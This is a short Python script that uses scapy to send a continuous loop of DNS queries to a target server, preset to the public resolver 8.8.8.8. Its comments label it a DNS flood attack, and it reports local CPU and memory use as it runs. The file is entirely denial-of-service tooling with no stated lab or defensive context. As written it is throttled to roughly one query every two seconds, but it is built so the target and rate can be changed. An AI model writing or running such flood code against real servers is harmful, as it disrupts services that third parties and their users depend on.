import psutil
import time
from scapy.all import *
from threading import Thread

# Target DNS Configuration
target_dns = "8.8.8.8"  # Replace with the target DNS server IP

# Function to simulate DNS Flood
def dns_flood():
    print("Starting DNS flood...")
    while True:
        send(IP(dst=target_dns)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com")), verbose=False)
        # Track and display CPU and memory usage
        track_cpu_memory("DNS")
        time.sleep(1)

# Function to track and display CPU and memory usage
def track_cpu_memory(flood_type):
    cpu = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory().percent
    print(f"{flood_type} Flood - CPU Usage: {cpu}% | Memory Usage: {memory}%")

# Start the DNS flood attack
if __name__ == "__main__":
    dns_thread = Thread(target=dns_flood)
    dns_thread.start()
    dns_thread.join()
